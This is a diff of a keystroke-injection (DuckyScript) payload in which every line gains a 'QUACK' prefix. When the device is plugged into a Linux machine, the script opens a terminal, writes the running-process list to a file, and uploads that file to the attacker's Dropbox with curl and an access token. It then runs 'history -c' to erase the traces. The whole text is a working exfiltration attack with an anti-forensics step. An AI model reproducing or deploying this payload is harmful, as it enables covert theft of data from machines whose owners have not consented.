@@ -12,53 +12,54 @@
 *     - Internet Connection
 *     - Discord Webhook
 
-DELAY 1000
-CTRL-ALT t
-DELAY 2000
+QUACK DELAY 1000
+QUACK CTRL-ALT t
+QUACK DELAY 2000
 
 
 * #### GET PROCESS SECTION ####
 
 
-STRING ps aux > process.txt
-ENTER
-DELAY 500
+QUACK STRING ps aux > process.txt
+QUACK ENTER
+QUACK DELAY 500
 
 
 * #### EXFILTRATE SECTION ####
 
 
 * Required: Set here your Dropbox access TOKEN
-STRING ACCESS_TOKEN="TOKEN"
-ENTER
-DELAY 500
+QUACK STRING ACCESS_TOKEN="TOKEN"
+QUACK ENTER
+QUACK DELAY 500
 
-STRING USER_NAME=$(whoami)
-ENTER
-DELAY 500
+QUACK STRING USER_NAME=$(whoami)
+QUACK ENTER
+QUACK DELAY 500
 
-STRING TXT_PATH="/home/$USER_NAME/process.txt"
-ENTER
-DELAY 500
+QUACK STRING TXT_PATH="/home/$USER_NAME/process.txt"
+QUACK ENTER
+QUACK DELAY 500
 
 * Set yout Dropbox folder name
-STRING DROPBOX_FOLDER="/DROPBOX_FOLDER_NAME"
-ENTER
-DELAY 500
+QUACK STRING DROPBOX_FOLDER="/DROPBOX_FOLDER_NAME"
+QUACK ENTER
+QUACK DELAY 500
 
 * DEFINE DROPBOX_API_CONST https://content.dropboxapi.com/2/files/upload
-STRING curl -X POST DROPBOX_API_CONST --header "Authorization: Bearer $ACCESS_TOKEN" --header "Dropbox-API-Arg: {\"path\": \"$DROPBOX_FOLDER\",\"mode\": \"add\",\"autorename\": true,\"mute\": false}" --header "Content-Type: application/octet-stream" --data-binary "@$TXT_PATH"
-ENTER
+QUACK STRING curl -X POST DROPBOX_API_CONST --header "Authorization: Bearer $ACCESS_TOKEN" --header "Dropbox-API-Arg: {\"path\": \"$DROPBOX_FOLDER\",\"mode\": \"add\",\"autorename\": true,\"mute\": false}" --header "Content-Type: application/octet-stream" --data-binary "@$TXT_PATH"
+QUACK ENTER
 
 * It depends by the internet connection, btw 1 or 2 seconds, generally, is sufficient
-DELAY 2000
+QUACK DELAY 2000
 
 
 * #### *OVE TRACES ####
 
 
-STRING history -c
-ENTER
-DELAY 500
-STRING exit
-ENTER
+QUACK STRING history -c
+QUACK ENTER
+QUACK DELAY 500
+QUACK STRING exit
+QUACK ENTER
+Update payload.txt
